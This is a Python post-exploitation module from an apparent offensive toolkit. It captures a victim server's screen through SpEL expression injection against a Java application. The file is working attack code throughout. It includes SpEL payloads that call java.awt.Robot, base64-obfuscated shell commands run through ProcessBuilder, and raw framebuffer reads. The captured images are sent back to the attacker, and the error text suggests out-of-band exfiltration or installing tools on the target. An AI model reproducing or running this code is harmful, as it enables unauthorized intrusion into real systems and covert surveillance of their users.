# language: Python 3.10+, file: modules/post/screenshot.py
# Post-exploitation: screenshot capture via SpEL injection.
# Leverages java.awt.Robot through the confirmed SpEL surface to capture
# the display of the host running the target JVM.
#
# Delivery vectors (tried in order):
#   1. SpEL via java.awt.Robot.createScreenCapture → PNG → base64 string
#   2. Runtime.exec of native screenshot tools (scrot, gnome-screenshot, import, xwd)
#   3. /proc/fb0 framebuffer raw read (headless fallback, low fidelity)

import base64
import json
import re
import ssl
import time
import os
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.exploit_core import ExploitCoreResult


# ─── Helpers (mirrors cmd_exec pattern) ──────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send(url: str, body: bytes, headers: dict, method: str = "POST",
          timeout: float = 20.0) -> tuple[int, str]:
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return r.status, r.read(65536).decode(errors="replace")
    except urllib.error.HTTPError as e:
        body_resp = ""
        try:
            body_resp = e.read(65536).decode(errors="replace")
        except Exception:
            pass
        return e.code, body_resp
    except Exception as e:
        return 0, str(e)


def _try_spel(base: str, path: str, expression: str, timeout: float) -> tuple[int, str]:
    body = json.dumps({"expression": expression, "data": expression}).encode()
    headers = {"Content-Type": "application/json", "User-Agent": "Java4Shell-PostEx/1.0"}
    return _send(base.rstrip("/") + path, body, headers, timeout=timeout)


# ─── SpEL payloads ────────────────────────────────────────────────────────────

# Payload 1: headless check
_SPEL_HEADLESS_CHECK = (
    "T(java.awt.GraphicsEnvironment).isHeadless()"
)

# Payload 2: full AWT screenshot → PNG bytes → base64 string
# Returns a base64-encoded PNG as a plain string in the SpEL result.
_SPEL_SCREENSHOT_AWT = (
    "new String("
    "  java.util.Base64.getEncoder().encode("
    "    new java.util.function.Supplier<byte[]>() {"
    "      public byte[] get() {"
    "        try {"
    "          java.awt.Robot r = new java.awt.Robot();"
    "          java.awt.Dimension d = java.awt.Toolkit.getDefaultToolkit().getScreenSize();"
    "          java.awt.image.BufferedImage img = r.createScreenCapture(new java.awt.Rectangle(d));"
    "          java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();"
    "          javax.imageio.ImageIO.write(img, \"PNG\", baos);"
    "          return baos.toByteArray();"
    "        } catch(Exception e) { return e.getMessage().getBytes(); }"
    "      }"
    "    }.get()"
    "  )"
    ")"
)

# Payload 3: get screen dimensions without capture
_SPEL_SCREEN_SIZE = (
    "java.awt.Toolkit.getDefaultToolkit().getScreenSize().width"
    " + \"x\" + "
    "java.awt.Toolkit.getDefaultToolkit().getScreenSize().height"
)

# Payload 4: exec a native screenshot tool and read the PNG back as base64.
# Writes to /tmp/ss_<ts>.png then reads it.
def _spel_exec_screenshot(tool: str, tmpfile: str) -> str:
    """
    Build SpEL to run a native tool, wait briefly, then read and base64 the file.
    tool: full shell command to produce tmpfile
    tmpfile: absolute path the tool writes to
    """
    tool_b64 = base64.b64encode(tool.encode()).decode()
    return (
        "new java.util.function.Supplier<String>() {"
        "  public String get() {"
        "    try {"
        "      String[] cmd = {\"sh\", \"-c\","
        f"       new String(java.util.Base64.getDecoder().decode(\"{tool_b64}\"))"
        "      };"
        "      Process p = new ProcessBuilder(cmd).start();"
        "      p.waitFor();"
        "      java.nio.file.Path fp = java.nio.file.Paths.get(\""
        + tmpfile
        + "\");"
        "      byte[] data = java.nio.file.Files.readAllBytes(fp);"
        "      return new String(java.util.Base64.getEncoder().encode(data));"
        "    } catch(Exception e) { return \"ERR:\" + e.getMessage(); }"
        "  }"
        "}.get()"
    )

# Payload 5: read /proc/fb0 framebuffer (raw, not PNG — caller notes this)
_SPEL_FRAMEBUFFER = (
    "new java.util.function.Supplier<String>() {"
    "  public String get() {"
    "    try {"
    "      byte[] data = java.nio.file.Files.readAllBytes("
    "        java.nio.file.Paths.get(\"/proc/fb0\"));"
    "      return new String(java.util.Base64.getEncoder().encode(data));"
    "    } catch(Exception e) { return \"ERR:\" + e.getMessage(); }"
    "  }"
    "}.get()"
)


# ─── Result ───────────────────────────────────────────────────────────────────

@dataclass
class ScreenshotResult:
    success: bool = False
    technique: str = ""
    image_bytes: bytes = b""       # raw PNG (or framebuffer raw if fb0 path)
    image_b64: str = ""            # base64 of image_bytes
    saved_path: str = ""           # absolute path if saved to disk
    is_headless: bool = False
    width: int = 0
    height: int = 0
    notes: list[str] = field(default_factory=list)
    error: Optional[str] = None


# ─── Internal helpers ─────────────────────────────────────────────────────────

def _extract_spel_string(body: str) -> str:
    """
    Extract the SpEL expression result from various response shapes:
    - JSON {"result": "...", "value": "...", "output": "..."}
    - Plain text that is entirely the base64 string
    - Wrapped in quotes somewhere in the body
    """
    for key in ("result", "value", "output", "data", "expression", "text", "message"):
        m = re.search(rf'"{key}"\s*:\s*"([A-Za-z0-9+/=\r\n]+)"', body)
        if m:
            candidate = m.group(1).strip()
            if len(candidate) > 10:
                return candidate

    # Try the whole body as base64 (some endpoints return naked result)
    stripped = body.strip().strip('"')
    if re.fullmatch(r'[A-Za-z0-9+/=\r\n]+', stripped) and len(stripped) > 10:
        return stripped

    return ""


def _decode_b64_safe(s: str) -> Optional[bytes]:
    try:
        return base64.b64decode(s.replace("\n", "").replace("\r", ""))
    except Exception:
        return None


def _is_png(data: bytes) -> bool:
    return data[:8] == b"\x89PNG\r\n\x1a\n"


def _parse_dimensions_from_png(data: bytes) -> tuple[int, int]:
    """Read width/height from PNG IHDR chunk (bytes 16–24)."""
    if len(data) < 24 or not _is_png(data):
        return 0, 0
    import struct
    w = struct.unpack(">I", data[16:20])[0]
    h = struct.unpack(">I", data[20:24])[0]
    return w, h


def _save_image(data: bytes, output_dir: str, suffix: str = "png") -> str:
    ts = int(time.time())
    filename = f"screenshot_{ts}.{suffix}"
    path = os.path.join(output_dir, filename)
    with open(path, "wb") as f:
        f.write(data)
    return path


# ─── Main function ────────────────────────────────────────────────────────────

def run_screenshot(fp: FingerprintResult,
                   core: ExploitCoreResult,
                   output_dir: Optional[str] = None,
                   timeout: float = 20.0,
                   verbose: bool = False) -> ScreenshotResult:
    """
    Attempt to capture a screenshot of the target server's display via SpEL injection.

    Tries in order:
      1. AWT Robot (requires display, works on Jenkins UI / Keycloak admin / dev servers)
      2. Native tools: scrot, gnome-screenshot, import (ImageMagick), xwd
      3. /proc/fb0 framebuffer read (headless last resort)

    Returns a ScreenshotResult. If output_dir is provided and the capture
    succeeds, the image is saved to output_dir/screenshot_<timestamp>.png.
    """
    result = ScreenshotResult()

    if not core.oob_triggered:
        result.error = "OOB write not confirmed — run exploit core first."
        result.notes.append("Skipped: exploit core did not confirm OOB trigger.")
        return result

    base = fp.target_url.rstrip("/")
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    primary_path = endpoints[0]["path"] if endpoints else "/"
    secondary_paths = [e["path"] for e in endpoints[1:3]]

    def _deliver(spel_expr: str) -> tuple[int, str]:
        """Try primary endpoint, fall back to secondary paths."""
        code, body = _try_spel(base, primary_path, spel_expr, timeout)
        if code in (200, 500) and body:
            return code, body
        for path in secondary_paths:
            code, body = _try_spel(base, path, spel_expr, timeout)
            if code in (200, 500) and body:
                return code, body
        return code, body

    # ── Step 1: Headless check ─────────────────────────────────────────────
    if verbose:
        print("  [screenshot] Checking headless mode …")
    code, body = _deliver(_SPEL_HEADLESS_CHECK)
    headless_raw = _extract_spel_string(body).lower()
    if "true" in headless_raw or "true" in body.lower()[:200]:
        result.is_headless = True
        result.notes.append("Target JVM is headless — AWT Robot will fail; trying fallbacks.")
    else:
        result.notes.append("Headless check: display likely available.")

    # ── Step 2: Screen size (diagnostic) ──────────────────────────────────
    if not result.is_headless:
        code, body = _deliver(_SPEL_SCREEN_SIZE)
        dim_raw = _extract_spel_string(body)
        if not dim_raw:
            # bare response
            dim_raw = body.strip().strip('"')
        m = re.search(r"(\d+)x(\d+)", dim_raw)
        if m:
            result.width  = int(m.group(1))
            result.height = int(m.group(2))
            result.notes.append(f"Screen dimensions: {result.width}x{result.height}")

    # ── Step 3: AWT Robot capture ──────────────────────────────────────────
    if not result.is_headless:
        if verbose:
            print("  [screenshot] Trying AWT Robot capture …")
        code, body = _deliver(_SPEL_SCREENSHOT_AWT)
        b64_candidate = _extract_spel_string(body)
        if b64_candidate:
            img_bytes = _decode_b64_safe(b64_candidate)
            if img_bytes and _is_png(img_bytes):
                result.success     = True
                result.technique   = "SpEL-AWT-Robot"
                result.image_bytes = img_bytes
                result.image_b64   = base64.b64encode(img_bytes).decode()
                w, h = _parse_dimensions_from_png(img_bytes)
                if w: result.width  = w
                if h: result.height = h
                result.notes.append(
                    f"AWT Robot capture succeeded: {len(img_bytes)} bytes, "
                    f"{result.width}x{result.height}"
                )
                if output_dir:
                    result.saved_path = _save_image(img_bytes, output_dir, "png")
                    result.notes.append(f"Saved: {result.saved_path}")
                return result
            elif img_bytes:
                # Could be an error message encoded as base64
                try:
                    err_msg = img_bytes.decode(errors="replace")
                except Exception:
                    err_msg = repr(img_bytes[:64])
                result.notes.append(f"AWT Robot returned non-PNG data: {err_msg[:120]}")
        else:
            result.notes.append("AWT Robot: no base64 output extracted from response.")

    # ── Step 4: Native screenshot tools via Runtime.exec ──────────────────
    tmpfile = f"/tmp/ss_{int(time.time())}.png"
    native_tools = [
        ("scrot",            f"scrot {tmpfile}"),
        ("gnome-screenshot", f"gnome-screenshot -f {tmpfile}"),
        ("import-im",        f"import -window root {tmpfile}"),
        ("xwd",              f"xwd -root -silent | convert xwd:- {tmpfile}"),
    ]

    for tool_name, shell_cmd in native_tools:
        if verbose:
            print(f"  [screenshot] Trying native tool: {tool_name} …")
        spel = _spel_exec_screenshot(shell_cmd, tmpfile)
        code, body = _deliver(spel)
        b64_candidate = _extract_spel_string(body)
        if b64_candidate:
            img_bytes = _decode_b64_safe(b64_candidate)
            if img_bytes and _is_png(img_bytes):
                result.success     = True
                result.technique   = f"SpEL-exec-{tool_name}"
                result.image_bytes = img_bytes
                result.image_b64   = base64.b64encode(img_bytes).decode()
                w, h = _parse_dimensions_from_png(img_bytes)
                if w: result.width  = w
                if h: result.height = h
                result.notes.append(
                    f"Native tool '{tool_name}' succeeded: "
                    f"{len(img_bytes)} bytes, {result.width}x{result.height}"
                )
                if output_dir:
                    result.saved_path = _save_image(img_bytes, output_dir, "png")
                    result.notes.append(f"Saved: {result.saved_path}")
                return result
            elif b64_candidate.startswith("ERR:"):
                result.notes.append(f"{tool_name}: {b64_candidate[4:100]}")
            else:
                result.notes.append(f"{tool_name}: non-PNG data returned.")
        else:
            result.notes.append(f"{tool_name}: no data in response (tool likely absent).")

    # ── Step 5: /proc/fb0 framebuffer ─────────────────────────────────────
    if verbose:
        print("  [screenshot] Trying /proc/fb0 framebuffer fallback …")
    code, body = _deliver(_SPEL_FRAMEBUFFER)
    b64_candidate = _extract_spel_string(body)
    if b64_candidate and not b64_candidate.startswith("ERR:"):
        fb_bytes = _decode_b64_safe(b64_candidate)
        if fb_bytes and len(fb_bytes) > 1024:
            result.success     = True
            result.technique   = "SpEL-framebuffer-fb0"
            result.image_bytes = fb_bytes
            result.image_b64   = base64.b64encode(fb_bytes).decode()
            result.notes.append(
                f"Framebuffer /proc/fb0 read: {len(fb_bytes)} raw bytes "
                "(not PNG — raw BGRA/RGB framebuffer data; convert manually)"
            )
            if output_dir:
                result.saved_path = _save_image(fb_bytes, output_dir, "raw")
                result.notes.append(f"Saved raw framebuffer: {result.saved_path}")
            return result
        elif b64_candidate.startswith("ERR:"):
            result.notes.append(f"fb0: {b64_candidate[4:100]}")
    else:
        result.notes.append("/proc/fb0: not readable or no data.")

    # ── All techniques exhausted ───────────────────────────────────────────
    if not result.success:
        if result.is_headless:
            result.error = (
                "Target JVM is headless and no native screenshot tool found. "
                "Consider running 'Xvfb :99' on the target and retrying with "
                "DISPLAY=:99 set, or use the cmd_exec module to install scrot."
            )
        else:
            result.error = (
                "All screenshot techniques failed. The display may require "
                "authentication (Xauthority) or the SpEL result is not reflected "
                "in the response body. Try extracting via OOB (DNS/HTTP callback)."
            )

    return result


# ─── Print helper ─────────────────────────────────────────────────────────────

def print_screenshot(r: ScreenshotResult) -> None:
    status = "✓ SUCCESS" if r.success else "✗ FAILED"
    print(f"\n[screenshot] {status}")
    print(f"  Technique  : {r.technique or 'none'}")
    print(f"  Headless   : {r.is_headless}")
    if r.width and r.height:
        print(f"  Dimensions : {r.width}x{r.height}")
    if r.image_bytes:
        print(f"  Image size : {len(r.image_bytes)} bytes")
    if r.saved_path:
        print(f"  Saved to   : {r.saved_path}")
    if r.image_b64 and not r.saved_path:
        preview = r.image_b64[:64] + "…"
        print(f"  Base64     : {preview}")
    for note in r.notes:
        print(f"  [*] {note}")
    if r.error:
        print(f"  [!] {r.error}")
